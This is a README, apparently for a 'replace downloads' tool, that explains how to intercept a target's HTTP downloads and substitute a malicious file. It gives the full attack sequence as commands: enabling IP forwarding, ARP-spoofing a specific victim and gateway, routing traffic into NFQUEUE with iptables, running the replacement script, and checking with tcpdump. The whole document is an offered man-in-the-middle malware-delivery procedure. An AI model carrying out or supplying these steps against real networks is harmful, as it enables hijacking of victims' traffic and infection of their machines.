### Replace downloads  
is a program to replace the download file which target user downloads.  
We can modify what user downloading and we can replace it with file which we want user should downloads, a malicious file.
Modifying every requests manually after intercepting each request will be time consuming, to solve this, we automate it.  
  
### usage - sudo python2 replace_downloads.py 
or sudo python replace_downloads.py 
<pre>
Steps:  
    0. Update script with required changes - updating host and file to file.  
    1. Forward all packets to our computer  
        1. echo 1 > /proc/sys/net/ipv4/ip_forward  
    2. ARP Spoof  
	1. arpspoof -i eth0 -t 10.0.2.15 10.0.2.1  
	2. arpspoof -i eth0 -t 10.0.2.1 10.0.2.15  
    3. Forward all dns - block all real packets  
    	To test in local system or same system  
	  1. sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0  
          2. sudo iptables -I INPUT -j NFQUEUE --queue-num 0  
            or we can route for specific port
          1. sudo iptables -I OUTPUT -p tcp --sport 80 -j NFQUEUE --queue-num 0  
	  2. sudo iptables -I INPUT -p tcp --dport 80 -j NFQUEUE --queue-num 0  
       To test in other system, target system  
          1. sudo iptables -I FORWARD -j NFQUEUE --queue-num 0     
    4. sudo python2 replace_downloads.py or sudo python replace_downloads.py 
    5. To check if its working  
        1. tcpdump -i eth0 udp port 53  
        2. sudo iptables -L -v -n  
        3. sudo tcpdump -i any port 80 -A | grep ".jpg"  
        4. sudo tcpdump -i any -A port 80 | grep -Ei "\.jpg|\.exe|\.pdf"  
    6. After completing - flush the rules  
        1. iptables --flush  
        2. iptables -t nat -F  
</pre> 
  
Run the steps following them and we can spoof and replace the file in target system.  
  
Requirements - install required libraries. For help, refer tools section
